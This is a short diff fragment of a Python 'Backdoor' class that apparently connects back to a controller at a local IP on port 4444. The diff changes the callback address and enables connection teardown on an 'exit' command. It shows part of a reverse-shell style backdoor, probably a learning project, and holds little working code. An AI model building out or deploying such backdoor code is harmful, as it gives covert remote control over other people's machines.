@@ -52,14 +52,14 @@ class Backdoor:
 				
 				if command == "exit":
 					print("im here")
-					# self.connection.close()
-					# self.connectd = False
-					# break
+					self.connection.close()
+					self.connectd = False
+					break
 
 
 
 if __name__ == "__main__":
-	backdoor = Backdoor("192.168.0.108", 4444)
+	backdoor = Backdoor("192.168.0.199", 4444)
 
 	backdoor_thread = threading.Thread(target=backdoor.connect)
 	backdoor_thread.start()
